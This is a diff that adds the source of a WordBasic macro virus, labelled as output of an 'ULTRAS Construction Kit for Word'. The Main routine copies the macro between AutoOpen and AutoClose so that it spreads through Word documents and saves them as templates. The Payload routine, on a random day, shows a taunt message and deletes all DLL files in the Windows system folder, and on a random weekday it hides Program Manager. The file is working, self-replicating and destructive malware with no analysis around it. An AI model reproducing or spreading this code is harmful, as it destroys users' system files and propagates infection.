@@ -1,0 +1,27 @@
+'*************************************
+'* ULTRAS CONSTRUCTION KIT FOR WORD  *
+'*            Version 2.0            *
+'*************************************
+Sub Main
+On Error Resume Next
+uCkAo$ = FileName$() + ":AutoOpen"
+uCkAc$ = "AutoClose"
+MacroCopy uCkAo$, uCkAc$
+FileSaveAs .Format = 1
+MacroCopy uCkAc$, uCkAo$
+FileSave
+Payload
+End Sub
+Sub Payload
+U = Int(Rnd() * 30) + 1
+If Day(Now()) = U Then
+MsgBox("ZL0BA by ULTRAS"),("UCK"), 16
+Destroy$ = "C:\Windows\system\*.dll"
+SetAttr Destroy$, 0
+Kill Destroy$
+End If
+G = Int(Rnd() * 6) + 1
+If Weekday(Now()) = G Then
+AppHide("Program Manager")
+End If
+End Sub
